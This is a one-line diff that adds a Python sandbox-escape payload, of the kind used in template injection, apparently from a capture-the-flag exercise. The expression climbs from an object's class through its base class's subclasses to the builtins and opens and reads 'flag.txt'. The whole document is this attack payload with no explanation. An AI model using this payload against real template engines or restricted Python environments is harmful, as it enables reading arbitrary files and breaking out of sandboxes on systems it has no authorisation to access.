@@ -1,0 +1,1 @@
+self.__class__.__base__.__subclasses__()[133].__init__.__globals__["__builtins__"].open("flag.txt").read()
